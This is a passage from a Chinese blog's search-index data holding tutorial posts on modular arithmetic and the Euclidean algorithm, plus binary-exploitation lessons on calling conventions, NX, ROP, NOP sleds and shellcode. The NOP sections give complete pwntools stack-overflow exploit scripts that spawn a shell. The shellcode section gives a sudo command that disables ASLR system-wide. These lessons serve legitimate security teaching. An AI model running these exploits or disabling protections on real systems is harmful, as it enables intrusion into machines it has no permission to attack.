a^{-1} \\mod p \\\\ a^{p-2} \\equiv a^{-1} \\mod p\\] ","date":"2023-08-10","objectID":"/rings-fields-and-eulers-totient-function/:3:4","tags":["Crypto"],"title":"环、域和欧拉函数","uri":"/rings-fields-and-eulers-totient-function/"},{"categories":["Cryptography"],"content":"模运算基础知识简介 ","date":"2023-08-10","objectID":"/modular-arithmetic/:0:0","tags":["Crypto"],"title":"模运算","uri":"/modular-arithmetic/"},{"categories":["Cryptography"],"content":"0x01 基础 模运算几乎是所有非对称密码学的一个极其重要的方面。一种常见的称呼方式是 时钟算术 ——想象现在是十一点。三个小时后就两点了，对吧？我们在模算术中做了同样的事情： $$11 + 3 = 14 \\equiv 2 \\mod 12$$ 这个式子的含义是：在模数为 $12$ 的情况下，$11 + 3$ 得到的余数是 $2$ 。 本质上，我们将 $11$ 和 $3$ 相加，然后除以 $12$ 并保留余数。这里，$12$ 被称为 模数。 $\\equiv$ 表示同余，我们说 $14$ 与 $2 \\mod 12$ 是同余的。 我们可以用另一种方式来思考这个问题，如果两个数 $a$ 和 $b$ 的差值 $a - b$ 能被 $m$ 整除，那么这两个数 $a$ 和 $b$ 同余模 $m$ 。例如，$26$ 和 $2$ 同余模 $12$ ， 因为 $26 - 2 = 24$ 可以被 $12$ 整除。 ","date":"2023-08-10","objectID":"/modular-arithmetic/:1:0","tags":["Crypto"],"title":"模运算","uri":"/modular-arithmetic/"},{"categories":["Cryptography"],"content":"0x02 模反元素（模逆元） 在普通数学中，每个数字都有一个 倒数。当与它相乘时，积为 $1$ 。用数学术语来说就是： 对于每个数字 $a$ 都有另一个 $b$ ，其中 $ab = 1$ 。通常我们可以说 $a$ 的倒数是 $\\frac{1}{a}$ 。 例如，$7$ 的倒数是 $\\frac{1}{7}$ 。 在模运算中，没有分数。我们不是找到满足 $ab = 1$ 的 $b$，而是找到满足 $ab \\equiv 1 \\mod m$ 的 $b$ ，即：有一个整数 $a$ ，在给定模数 $m$ 下，存在一个整数 $b$ ，使得 $(a \\cdot b) \\% m = 1$ 。 换句话说，$b$ 就是 $a$ 在模 $m$ 下的模反元素。这意味着对于不同的 $m$ 值，$a$ 有不同的 模逆元（模倒数） 。例如，$3 \\mod 5$ 的模逆元是 $2$，因为 $3 \\cdot 2 = 6 \\equiv 1 \\mod 5$， 因此我们也可以说 $3^{-1} \\equiv 2 \\mod 5$ 。 然而，并非每个数字 $a$ 都有模 $m$ 的模反元素。例如，$2$ 没有模 $6$ 的模反元素。这是 因为 $gcd(a, m) = 1$ 。让我们在一般情况下证明这一点，看看为什么会这样。 ","date":"2023-08-10","objectID":"/modular-arithmetic/:2:0","tags":["Crypto"],"title":"模运算","uri":"/modular-arithmetic/"},{"categories":["Cryptography"],"content":"1x01 证明 假设存在 $b$ 使得 $a \\cdot b \\equiv 1 \\mod m$ 。这意味着也存在 $c$ 使得 $ab = cm + 1$ ， 因此 $ab − cm = 1$ 。因此两边都可以被 $gcd(a, m)$ 整除，即 $gcd(a, m) = 1$ 。 因此，如果存在模 $m$ 的模反元素，则只有 $gcd(a, m) = 1$ 时才存在这样的模反元素。$\\Box$ ","date":"2023-08-10","objectID":"/modular-arithmetic/:2:1","tags":["Crypto"],"title":"模运算","uri":"/modular-arithmetic/"},{"categories":["Cryptography"],"content":"1x02 直观的方法 如果你正在努力想象这个证明，请回想一下前面的例子，$2$ 没有模 $6$ 的模反元素，为什么呢？ 因为在模 $6$ 下 $2$ 的倍数的序列是 $0,2,4,0,2,4,…$ 并循环，没有任何整数 $b$ 可以满足 $(2 \\cdot b) \\% 6 = 1$ ，因为它是 $6$ 的因数。 实际上，模反元素只在两个数互质（最大公约数为 $1$）的情况下存在。我们可以使用拓展欧几里得算法 来找到模反元素。但是对于像 $2$ 和 $6$ 这样有公因数的数，模反元素是不存在的，因为没有整数乘法 可以得到 $1$ 。如果我们选择 $4$ 而不是 $2$ ，我们可以看到这一点。如果有公因数（本例中为 $2$）， 则不存在 $4x$ 会返回 $1$ 模 $6$ 的值 $x$ 。任何可以与 $4$ 相乘的数字在除以 $6$ 时始终会得到 可被 $2$ 整除的余数。 我建议你花一些时间思考这个事实，因为这是一个非常重要的结果。 ","date":"2023-08-10","objectID":"/modular-arithmetic/:2:2","tags":["Crypto"],"title":"模运算","uri":"/modular-arithmetic/"},{"categories":["Cryptography"],"content":"1x03 用途 模逆元的用途与正则逆元的用途类似——即除法。通常，如果我们除两个数，我们可以将被除的数视为 乘以它的倒数 。 $$8 \\div 2 = 8 \\cdot 2^{-1} = 8 \\cdot \\frac{1}{2} = 4$$ 我们可以以同样的方式使用模反元素——假设我们想将 $3$ 除以 $2$，模 $7$ ： $$3 \\div 2 \\equiv 3 \\cdot 2^{-1} \\equiv 3 \\cdot 4 \\equiv 12 \\equiv 5 \\mod 7$$ 就像这样，我们意识到 $3$ 除以 $2$ 模 $7$ 得到 $5$ 。 信息 注意：$4$ 是 $2$ 的模逆元，即 $2 \\cdot 4 \\equiv 1 \\mod 7$ 。 ","date":"2023-08-10","objectID":"/modular-arithmetic/:2:3","tags":["Crypto"],"title":"模运算","uri":"/modular-arithmetic/"},{"categories":["Cryptography"],"content":"密码学建立在代数和数论的基础上，我希望在这里能充分介绍它们。 ","date":"2023-08-10","objectID":"/divisibility-factors-and-euclids-algorithms/:0:0","tags":["Crypto"],"title":"可除性，因数和欧几里得算法","uri":"/divisibility-factors-and-euclids-algorithms/"},{"categories":["Cryptography"],"content":"0x01 可除性 如果存在一个整数 $c$ 使得 $a = bc$ ，则称 $a$ 可被 $b$ 整除。在这种情况下， $b$ 被认为是 $a$ 的 因数。如果 $a$ 可以被 $b$ 整除，则可以用 $a \\mid b$ 表示。 相反的，$a \\nmid b$ 表示 $a$ 不可被 $b$ 整除。 ","date":"2023-08-10","objectID":"/divisibility-factors-and-euclids-algorithms/:1:0","tags":["Crypto"],"title":"可除性，因数和欧几里得算法","uri":"/divisibility-factors-and-euclids-algorithms/"},{"categories":["Cryptography"],"content":"0x02 最大公约数 给定两个整数 $a$ 和 $b$，最大公约数 $gcd(a, b)$（也称为最大公因数）是最大 整数 $p$ ，其中 $p \\mid a$ 且 $p \\mid b$ 。 ","date":"2023-08-10","objectID":"/divisibility-factors-and-euclids-algorithms/:2:0","tags":["Crypto"],"title":"可除性，因数和欧几里得算法","uri":"/divisibility-factors-and-euclids-algorithms/"},{"categories":["Cryptography"],"content":"1x01 欧几里得算法 给定 $a$ 和 $b$ ，我们可以写出连接两者的方程： $$a = b \\cdot q + r$$ 其中 $q$ 和 $r$ 是符合 $r \u003c b$ 方程的整数。基本上，$b$ 最多可分为 $q$ 次， 余数为 $r$ 。这就是窍门所在。 该方程中加在一起的每一项都必须能被 $gcd(a, b)$ 整除，因为如果我们将 $gcd$ 视为 $g$ ，我们可以说 $a = k_{1}g, b = k_{2}g$： $$k_{1}g = k_{2}g \\cdot q + r$$ 意味着 $r$ 必须是 $g$ 的整数倍。 但现在，如果我们跳出框框思考，我们就会意识到 $b$ 和 $r$ 都可以被 $gcd(a, b)$ 整除。所以我们可以计算 $gcd(b, r)$ 。 这是一个很大的飞跃，需要一些思考，但让我们用代数的方式来分解它： \\[ a = b \\cdot q_{0} + r_{1} \\\\ b = r_{1} \\cdot q_{1} + r_{2} \\\\ r_{1} = r_{2} \\cdot q_{2} + r_{3} \\\\ r_{2} = r_{3} \\cdot q_{3} + r_{4} \\] 等等，什么时候才能停止 GCD 呢？好吧，一旦 $r_{n} = 0$，我们就可以停止继续 GCD 了。 在这种情况下 $r_{n-2} \\mid r_{n-1}$，因此我们可以将 $r_{n-1}$ 作为 GCD 。 信息 我强烈建议你仔细考虑一下，直到它对你有意义为止。 例子 假设我们要求 8075 和 16283 的 GCD 。首先，我们可以将其写成 $a = b \\cdot q + r$ 的形式： $$16283 = 8075 \\cdot 2 + 133$$ 现在我们尝试计算 8075 和 133 的 GCD 。 \\[ 8075 = 133 \\cdot 60 + 95 \\\\ 133 = 95 \\cdot 1 + 38 \\\\ 95 = 38 \\cdot 2 + 19 \\\\ 38 = 19 \\cdot 2 + 0 \\] 因此，16283 和 8075 的 GCD 是 19 。 ","date":"2023-08-10","objectID":"/divisibility-factors-and-euclids-algorithms/:2:1","tags":["Crypto"],"title":"可除性，因数和欧几里得算法","uri":"/divisibility-factors-and-euclids-algorithms/"},{"categories":["Cryptography"],"content":"1x02 扩展欧几里得算法 我们可以进一步拓展欧几里得算法，除了 GCD 之外，还可以计算 $a, b$ 的 $u, v \\in \\mathbb{Z}$， 其总和等于 GCD，即： $$au + bv = gcd(a, b)$$ 这种拓展算法对于计算 模反元素 是非常有价值的。基于欧几里得算法计算 GCD， 然后将其写成其它数字，对最小的非 GCD 数字重复该过程，直到我们得出以下方程： 只有 GCD 和两个起始数字。让我们使用上面的例子，写出 GCD 的方程： $$19 = 95 - 38 \\cdot 2$$ 现在 38 是最小的非 GCD 数，我们可以根据示例中的方程序列中的较大数来写它，然后 重复下一个最小的数： \\[ 19 = 95 - 38 \\cdot 2 \\\\ = 95 - (133 - 95 \\cdot 1) \\cdot 2 \\\\ = 95 - (133 \\cdot 2 + 95 \\cdot -2) \\\\ = 95 \\cdot 3 + 133 \\cdot -2 \\\\ = (8075 + 133 \\cdot -60) \\cdot 3 + 133 \\cdot -2 \\\\ = 8075 \\cdot 3 + 133 \\cdot -180 + 133 \\cdot -2 \\\\ = 8075 \\cdot 3 + 133 \\cdot -182 \\\\ = 8075 \\cdot 3 + (16283 + 8075 \\cdot -2) \\cdot -182 \\\\ = 8075 \\cdot 3 + 16283 \\cdot -182 + 8075 \\cdot 364 \\\\ = 8075 \\cdot 367 + 16283 \\cdot -182 \\] 因此我们的方程 $au + bv = gcd(a, b)$ 如下： $$16283 \\cdot -182 + 8075 \\cdot 367 = 19$$ ","date":"2023-08-10","objectID":"/divisibility-factors-and-euclids-algorithms/:2:2","tags":["Crypto"],"title":"可除性，因数和欧几里得算法","uri":"/divisibility-factors-and-euclids-algorithms/"},{"categories":["PWN"],"content":"这篇文章将对 32-bit 和 64-bit 的调用约定进行更为深入的探讨。 ","date":"2023-08-09","objectID":"/calling-conventions/:0:0","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"0x01 单个参数 calling-conventions-one-param.zip /pwn_assets/calling-conventions-one-param.zip ","date":"2023-08-09","objectID":"/calling-conventions/:1:0","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"1x01 源码 我们先快速浏览一下源码： #include \u003cstdio.h\u003e void vuln(int check) { if (check == 0xdeadbeef) { puts(\"Nice!\"); } else { puts(\"Not nice!\"); } } int main() { vuln(0xdeadbeef); vuln(0xdeadc0de); } 分别运行 32-bit 和 64-bit 的 vuln，我们会得到相同的输出： Nice! Not nice! ","date":"2023-08-09","objectID":"/calling-conventions/:1:1","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"1x02 分析 vuln-32 用 pwndbg 对其进行反汇编： $ disass main Dump of assembler code for function main: 0x080491ac \u003c+0\u003e: lea ecx,[esp+0x4] 0x080491b0 \u003c+4\u003e: and esp,0xfffffff0 0x080491b3 \u003c+7\u003e: push DWORD PTR [ecx-0x4] 0x080491b6 \u003c+10\u003e: push ebp 0x080491b7 \u003c+11\u003e: mov ebp,esp 0x080491b9 \u003c+13\u003e: push ecx 0x080491ba \u003c+14\u003e: sub esp,0x4 0x080491bd \u003c+17\u003e: call 0x80491f4 \u003c__x86.get_pc_thunk.ax\u003e 0x080491c2 \u003c+22\u003e: add eax,0x2e3e 0x080491c7 \u003c+27\u003e: sub esp,0xc 0x080491ca \u003c+30\u003e: push 0xdeadbeef 0x080491cf \u003c+35\u003e: call 0x8049162 \u003cvuln\u003e 0x080491d4 \u003c+40\u003e: add esp,0x10 0x080491d7 \u003c+43\u003e: sub esp,0xc 0x080491da \u003c+46\u003e: push 0xdeadc0de 0x080491df \u003c+51\u003e: call 0x8049162 \u003cvuln\u003e 0x080491e4 \u003c+56\u003e: add esp,0x10 0x080491e7 \u003c+59\u003e: mov eax,0x0 0x080491ec \u003c+64\u003e: mov ecx,DWORD PTR [ebp-0x4] 0x080491ef \u003c+67\u003e: leave 0x080491f0 \u003c+68\u003e: lea esp,[ecx-0x4] 0x080491f3 \u003c+71\u003e: ret End of assembler dump. 如果我们仔细观察对 vuln 函数的调用，我们会看到一个 Pattern： push 0xdeadbeef call 0x8049162 \u003cvuln\u003e [...] push 0xdeadc0de call 0x8049162 \u003cvuln\u003e 在调用函数之前，我们实际上先将 参数 压入了栈。现在让我们来研究一下 vuln 函数。 $ b *0x08049162 $ r Breakpoint 1, 0x08049166 in vuln () $ x/20wx $esp 0xffffd6cc: 0x080491d4 0xdeadbeef 第一个值是我之前的博客中提到的 返回地址 ，而第二个值是 参数 。这是有道理的， 因为返回地址在 调用 期间被压入栈，因此它应该位于栈顶。现在让我们反汇编 vuln ： Dump of assembler code for function vuln: 0x08049162 \u003c+0\u003e: push ebp 0x08049163 \u003c+1\u003e: mov ebp,esp 0x08049165 \u003c+3\u003e: push ebx 0x08049166 \u003c+4\u003e: sub esp,0x4 0x08049169 \u003c+7\u003e: call 0x80491f4 \u003c__x86.get_pc_thunk.ax\u003e 0x0804916e \u003c+12\u003e: add eax,0x2e92 0x08049173 \u003c+17\u003e: cmp DWORD PTR [ebp+0x8],0xdeadbeef 0x0804917a \u003c+24\u003e: jne 0x8049192 \u003cvuln+48\u003e 0x0804917c \u003c+26\u003e: sub esp,0xc 0x0804917f \u003c+29\u003e: lea edx,[eax-0x1ff8] 0x08049185 \u003c+35\u003e: push edx 0x08049186 \u003c+36\u003e: mov ebx,eax 0x08049188 \u003c+38\u003e: call 0x8049030 \u003cputs@plt\u003e 0x0804918d \u003c+43\u003e: add esp,0x10 0x08049190 \u003c+46\u003e: jmp 0x80491a6 \u003cvuln+68\u003e 0x08049192 \u003c+48\u003e: sub esp,0xc 0x08049195 \u003c+51\u003e: lea edx,[eax-0x1ff2] 0x0804919b \u003c+57\u003e: push edx 0x0804919c \u003c+58\u003e: mov ebx,eax 0x0804919e \u003c+60\u003e: call 0x8049030 \u003cputs@plt\u003e 0x080491a3 \u003c+65\u003e: add esp,0x10 0x080491a6 \u003c+68\u003e: nop 0x080491a7 \u003c+69\u003e: mov ebx,DWORD PTR [ebp-0x4] 0x080491aa \u003c+72\u003e: leave 0x080491ab \u003c+73\u003e: ret End of assembler dump. 在这里，我显示了该命令的完整输出。因为其中有很多内容都是相关的。我们发现， 有一个地址为 ebp+0x8 的局部变量。后来，又将 ebp+0x8 与 0xdeadbeef 进行比较： cmp DWORD PTR [ebp+0x8],0xdeadbeef 因此可以分析出 ebp+0x8 就是我们的参数。 现在我们知道，当有一个参数时，它会被压入栈，使栈看起来像： return address param_1 ","date":"2023-08-09","objectID":"/calling-conventions/:1:2","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"1x03 分析 vuln-64 我们在这里再次反汇编 main ： Dump of assembler code for function main: 0x0000000000401153 \u003c+0\u003e: push rbp 0x0000000000401154 \u003c+1\u003e: mov rbp,rsp 0x0000000000401157 \u003c+4\u003e: mov edi,0xdeadbeef 0x000000000040115c \u003c+9\u003e: call 0x401122 \u003cvuln\u003e 0x0000000000401161 \u003c+14\u003e: mov edi,0xdeadc0de 0x0000000000401166 \u003c+19\u003e: call 0x401122 \u003cvuln\u003e 0x000000000040116b \u003c+24\u003e: mov eax,0x0 0x0000000000401170 \u003c+29\u003e: pop rbp 0x0000000000401171 \u003c+30\u003e: ret End of assembler dump. 我们发现 64-bit 和 32-bit 在传参上不一样了。正如我在这篇 博客 中所说的， 参数被移至 rdi（这里的反汇编中写的是 edi ，但 edi 只是 rdi 的低 32 bits 寄存器。原因是我们传入的参数只有 32 bits 大小，所以改为 EDI 可以节省 内存消耗）。如果我们再次中断 vuln ，我们可以使用以下命令检查 rdi ： $ regs rdi 信息 如果只使用 regs 则会显示所有寄存器。 $ b *0x000000000040115c $ r Breakpoint 1, 0x000000000040115c in main () $ regs rdi *RDI 0xdeadbeef 信息 64-bit 程序中，寄存器用于存放参数。但返回地址仍然压入栈，并且在 ROP 中放置在 函数地址之后。 注：只有前六个参数才会分别保存在寄存器中，如果还有更多的参数的话则会保存在栈上。 ","date":"2023-08-09","objectID":"/calling-conventions/:1:3","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"0x02 多个参数 calling-convention-multi-param.zip /pwn_assets/calling-convention-multi-param.zip ","date":"2023-08-09","objectID":"/calling-conventions/:2:0","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"1x01 源码 #include \u003cstdio.h\u003e void vuln(int check, int check2, int check3) { if (check == 0xdeadbeef \u0026\u0026 check2 == 0xdeadc0de \u0026\u0026 check3 == 0xc0ded00d) { puts(\"Nice!\"); } else { puts(\"Not nice!\"); } } int main() { vuln(0xdeadbeef, 0xdeadc0de, 0xc0ded00d); vuln(0xdeadc0de, 0x12345678, 0xabcdef10); } ","date":"2023-08-09","objectID":"/calling-conventions/:2:1","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"1x02 分析 vuln-32 由于我们之前已经看到了几乎相同的二进制文件的完整反汇编，因此在这里我只会列出 重要的部分： 0x080491dd \u003c+30\u003e: push 0xc0ded00d 0x080491e2 \u003c+35\u003e: push 0xdeadc0de 0x080491e7 \u003c+40\u003e: push 0xdeadbeef 0x080491ec \u003c+45\u003e: call 0x8049162 \u003cvuln\u003e [...] 0x080491f7 \u003c+56\u003e: push 0xabcdef10 0x080491fc \u003c+61\u003e: push 0x12345678 0x08049201 \u003c+66\u003e: push 0xdeadc0de 0x08049206 \u003c+71\u003e: call 0x8049162 \u003cvuln\u003e 我们发现 压栈 和 传参 顺序是相反的。这是因为取参的时候是从低地址向高地址取参， 而先入栈的在高地址，正好符合了取参从低向高的规则。 信息 大多数计算机系统结构中，栈是一种后进先出（Last In First Out，LIFO）的 数据结构。当程序调用一个函数时，函数的参数被压入栈中，而函数内部则可以 按照相反的顺序逐个弹出这些参数进行处理。这种设计有几个原因： 便于管理栈指针：压栈和出栈操作可以通过简单的栈指针操作来实现，无需 复杂的数据重排。这样可以减小指令的数量和复杂度，提高执行效率。 一致性：使用相同的栈结构来处理参数和局部变量可以简化函数调用和返回 的实现，使得代码更加一致和可维护。 节省存储空间：压栈和出栈操作可以在相对较小的内存区域进行，不需要预留 很大的内存来存储参数，这有助于节省内存空间。 举个例子：如果一个函数有三个参数：a、b 和 c ，调用函数时的顺序为 func(c, b, a) ， 则在栈中的存储顺序为 push a ，push b ，push c ，而在函数内部获取 参数的顺序为从栈顶依次弹出 pop c，pop b，pop a。 虽然压栈和实际程序传参的顺序相反，但这种细节是由编译器和计算机体系结构 来处理的，因此我们无需过多考虑。编译器会生成适当的指令来正确处理函数 参数的压栈和出栈操作，以确保函数调用的正确执行。 $ b *0x080491ec $ r Breakpoint 1, 0x080491ec in main () $ s $ x/20wx $esp 0xffffd6bc: 0x080491f1 0xdeadbeef 0xdeadc0de 0xc0ded00d 因此，如何将更多参数放置在栈上就变得非常清楚了： return address param1 param2 param3 [...] paramN ","date":"2023-08-09","objectID":"/calling-conventions/:2:2","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"1x03 分析 vuln-64 mov edx,0xc0ded00d mov esi,0xdeadc0de mov edi,0xdeadbeef call 0x401122 \u003cvuln\u003e [...] mov edx,0xabcdef10 mov esi,0x12345678 mov edi,0xdeadc0de call 0x401122 \u003cvuln\u003e 同理，根据上面的调试步骤查看寄存器内容，我们可以发现：除了 rdi 之外， 我们还把参数压到了 rsi 和 rdx 。 ","date":"2023-08-09","objectID":"/calling-conventions/:2:3","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"0x03 更大的 64-bits 值 只是为了表明实际上最终使用的是 rdi 而不是 edi ，我将更改原始的单参数 代码以使用更大的数字： #include \u003cstdio.h\u003e void vuln(long check) { if (check == 0xdeadbeefc0dedd00d) { puts(\"Nice!\"); } } int main() { vuln(0xdeadbeefc0dedd00d); } 如果你反汇编 main ，你可以看到它被反汇编为： movabs rax,0xeadbeefc0dedd00d mov rdi,rax call 0x401126 \u003cvuln\u003e 信息 movabs 用于将 mov 指令编码为 64-bit 指令，可将其视为 mov 。 ","date":"2023-08-09","objectID":"/calling-conventions/:3:0","tags":["PWN","Stack"],"title":"调用约定","uri":"/calling-conventions/"},{"categories":["PWN"],"content":"ROP 的基础是将二进制文件文件本身中已经存在的代码块链接在一起，以便执行你想要 的操作。这通常涉及将参数传递给 libc 中已经存在的函数，例如 system() 。如果你 可以找到命令的位置，例如 cat flag.txt，然后将其 作为参数 传递给 system() 函数， 它将执行该命令并返回输出。一个更危险的命令是 /bin/sh，当 system() 运行它时， 它会为攻击者提供一个 shell，就像我们使用的 shellcode 一样。 然而，这样做并没有看起来那么简单。为了能够正确调用函数，我们首先必须了解如何 向函数传递参数。 ","date":"2023-08-08","objectID":"/return-oriented-programming/:0:0","tags":["PWN","Stack"],"title":"面向返回编程简介","uri":"/return-oriented-programming/"},{"categories":["PWN"],"content":"正如你所预料的那样，程序员对于人们可以将自己的指令注入到程序中 感到非常高兴（bushi NX 位代表「不可执行」，将内存区域定义为 指令 或 数据，把需要写入数据的内存 标识为可写，把保存指令的内存标识为可执行，但不会有一块内存同时被标识为可写 和可执行。这意味着你的输入将被存储为 数据，任何将其作为指令运行的尝试 都会使程序崩溃，从而有效地阻止 shellcode 。 为了绕过 NX，我们必须使用一种被称为 ROP ，Return-Oriented Programming（面向返回 编程）的技术。 信息 Windows 版本的 NX 是 DEP（Data Execution Prevention），数据执行保护。 ","date":"2023-08-08","objectID":"/no-execute/:0:0","tags":["PWN","Stack"],"title":"No eXecute","uri":"/no-execute/"},{"categories":["PWN"],"content":"检查 NX 你可以使用 checksec 来检查 NX 的状态： $ checksec vuln [*] 'vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments ","date":"2023-08-08","objectID":"/no-execute/:1:0","tags":["PWN","Stack"],"title":"No eXecute","uri":"/no-execute/"},{"categories":["PWN"],"content":"到目前为止我们所做的一切都适用于 64-bit 和 32-bit；你唯一需要更改的是将 p32() 改为为 p64() ，因为内存地址更长。 然而，两者之间的真正区别在于将参数传递给函数的方式（我们很快就会更仔细地讨论）； 在 32-bit 中，所有参数在调用函数之前都被压入栈。然而，在 64-bit 中，根据调用约定， 前 6 个参数分别存储在寄存器 RDI、RSI、RDX、RCX、R8 和 R9 中，如果超过 6 个，还有更多的参数的话则会保存在栈上。 警告 不同的操作系统有不同的 调用约定 。 ","date":"2023-08-08","objectID":"/32-bit-vs-64-bit/:0:0","tags":["PWN","Stack"],"title":"32-bit vs 64-bit","uri":"/32-bit-vs-64-bit/"},{"categories":["PWN"],"content":"由于在调试工具里得到的返回地址和正常运行时并不一致（这是运行时环境变量等因素有所不同造成的）， 所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在溢出 Padding 前面填充 若干长度的 NOP 。 NOP，无操作（No OPeration）指令的作用正如其名：什么也不做。所以在运行到 NOP 指令的时候 只会使程序计数器加一，而不会发生其它的事情。这是一种可以破解栈随机化的缓冲区溢出攻击方式。 攻击者通过填充字符串注入攻击代码，在实际的攻击代码前注入很长的 NOP 指令序列，只要程序的 控制流指向该序列任意一处，都可以无副作用地跳转到 shellcode 的起始处，这允许我们有更大的 误差范围，因为向前或向后移动几个字节不会影响程序的正常运行。这与直接运行 shellcode 具有 相同的效果。这种 NOP Padding 通常被称为 NOP Slide 或 NOP Sled（俗称「滑雪橇」），因为 EIP 本质上是沿着它们 Slide 的。这样我们就可以通过增加 NOP 填充来试验 shellcode 的起始地址。NOP Sled 可以帮助攻击者提高访问到自己的攻击代码的概率。 地址空间配置随机化（ASLR） 指程序运行时栈的起始地址是随机的，所以程序中存放各函数返回地址 的地址也会发生对应的改变。可防止运行相同程序的相同系统因易预测栈地址而被攻击。 由于栈地址在一定范围的随机性，攻击者不能够知道攻击代码注入的地址，而要执行攻击代码需要将函数 的返回地址更改为攻击代码的地址（可以通过缓冲区溢出的方式篡改函数的返回地址）。所以，只能在一 定范围内（栈随机导致攻击代码地址一定范围内随机）枚举攻击代码的地址（有依据的猜）。 例子 为了尝试破解 $2^{23}$ 的随机化，则需要枚举 $2^{23}$ 个返回地址。而使用 NOP Sled 的方式， 若枚举一个 $2^{8}$ Bytes 的 NOP sled，则只需要枚举 $2^{23} / (2^{8} + 1)$ 个返回地址 即可，因为每次枚举出的地址只要是 $2^{8}$ 中的之一就可以。（攻击代码本身有一个起始地址， 所以为 $255 + 1$） 不用 NOP Sled，函数返回地址 —\u003e 攻击代码 使用 NOP Sled，函数返回地址 —\u003e NOP 序列（顺序执行）直到攻击代码地址 在 intel x86 汇编中，NOP 指令是 \\x90 。 NOP 指令是 XCHG EAX, EAX 的别名（32 bit 系统中），它实际上什么也不做。你可以在这个 问题 上阅读更多相关信息。 ","date":"2023-08-08","objectID":"/nops/:0:0","tags":["PWN","Stack"],"title":"NOPs","uri":"/nops/"},{"categories":["PWN"],"content":"0x01 更新 EXP 现在可以对我们的 EXP 进行一些细微的更改，以完成两件事： 添加大量 NOP Padding 调整我们的返回地址以指向 NOP 的中间而不是缓冲区的开头 警告 确保 ASLR 仍处于禁用状态。你可能需要重新调整之前的 EXP，因为缓冲区位置可能会有所不同。 from pwn import * context(os='linux', arch='amd64', log_level='info') context.binary = ELF('./vuln') p = process() payload = b'\\x90' * 240 # 构建 NOPs payload += asm(shellcraft.sh()) # 构建 shellcode payload = payload.ljust(312, b'A') # 溢出 Padding payload += p32(0xffffd664 + 120) # 缓冲区地址 + 一半 NOPs 长度 p.sendline(payload) p.interactive() 警告 值得一提的是：带有 NOP 的 shellcode 并不是万无一失的。如果出现用 NOP Sled 造成的 意外错误，但 shellcode 在使用 NOP Sled 之前可以正常工作，请尝试减少 NOP Sled 的 长度，因为它可能会篡改栈上的其它内容。 注意：NOP 在某些架构中不是 \\x90 。如果你需要其他架构的 NOP，可以使用 pwntools： nop = asm(shellcraft.nop()) ","date":"2023-08-08","objectID":"/nops/:1:0","tags":["PWN","Stack"],"title":"NOPs","uri":"/nops/"},{"categories":["PWN"],"content":"0x02 最终 EXP from pwn import * context(os='linux', arch='amd64', log_level='info') context.binary = ELF('./vuln') p = process() payload = asm(shellcraft.nop()) * 240 # 构建 NOPs payload += asm(shellcraft.sh()) # 构建 shellcode payload = payload.ljust(312, b'A') # 溢出 Padding payload += p32(0xffffd664 + 120) # 缓冲区地址 + 一半 NOPs 长度 p.sendline(payload) p.interactive() ","date":"2023-08-08","objectID":"/nops/:2:0","tags":["PWN","Stack"],"title":"NOPs","uri":"/nops/"},{"categories":["PWN"],"content":"在真正的漏洞利用中，你不太可能拥有 win() 函数。shellcode 是一种允许 运行你自己的 指令 的方法，使你能够在系统上运行任意命令。 shellcode 本质上是 一系列汇编指令，一旦我们将它输入到二进制文件中，它就会覆盖返回 地址（返回指针）以劫持代码，并执行我们自己的指令。 警告 我保证你可以相信我，但你永远不应该在不知道 shellcode 作用的情况下运行它。 pwntools 很安全，并且几乎拥有你需要的所有 shellcode 。 shellcode 成功的原因是 冯·诺伊曼结构（当今大多数计算机使用的体系结构）不区分 数据和指令——无论你告诉它在哪里运行或运行什么内容，它都会尝试运行它。因此， 即使我们输入的是攻击指令，计算机也不知道这一点，我们可以利用它来发挥我们的优势。 shellcode.zip /pwn_assets/shellcode.zip ","date":"2023-08-08","objectID":"/shellcode/:0:0","tags":["PWN","Stack"],"title":"shellcode","uri":"/shellcode/"},{"categories":["PWN"],"content":"0x01 禁用 ASLR ASLR 是一种安全技术，虽然它不是专门为对抗 shellcode 而设计的，但它涉及随机化 内存的某些方面，可以看我的这篇博客：NOPs 。这种随机化可能会使我们的 shellcode 变得不可靠，所以我们现在将 禁用 它。 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 信息 类似这样的功能性指令以后还会碰到更多，我建议使用 alias 为它们创建一个别名。 因为就算不考虑能不能记住这些指令，如果每次都手动输入那么长的指令也是一件很 浪费时间的事情。 警告 再次强调，如果你不知道指令的作用，则永远不要运行该指令。 ","date":"2023-08-08","objectID":"/shellcode/:1:0","tags":["PWN","Stack"],"title":"shellcode","uri":"/shellcode/"},{"categories":["PWN"],"content":"0x02 确定缓冲区位置 使用 pwndbg 调试 vuln ，并找出缓冲区在内存中的起始位置；这就是我们 想要将返回地址指向的位置。 $ pwndbg vuln $ disass unsafe [...] 0x0804918a \u003c+24\u003e: lea eax,[ebx-0x1ff8] [...] 0x0804919c \u003c+42\u003e: lea eax,[ebp-0x134] [...] 0x080491ac \u003c+58\u003e: mov ebx,DWORD PTR [ebp-0x4] [...] 可以根据大小判断哪个是 局部变量。根据缓冲区大小是 300，可以判断出 ebp-0x134 很可能是缓冲区。让我们在 gets() 之后设置一个断点并找到确切 的返回地址。 $ b *0x080491a8 $ r Overflow me \u003c\u003cIM HERE\u003e\u003e \u003c== This was my input $ x/20s $esp [...] 0xffffd664: \"\u003c\u003cIM HERE\u003e\u003e\" [...] 它似乎位于 0xffffd664 ；如果我们多次运行二进制文件，它应该保持在原来的位置 （如果没有，请确保 禁用 ASLR！）。 ","date":"2023-08-08","objectID":"/shellcode/:2:0","tags":["PWN","Stack"],"title":"shellcode","uri":"/shellcode/"},{"categories":["PWN"],"content":"0x03 计算溢出 Padding 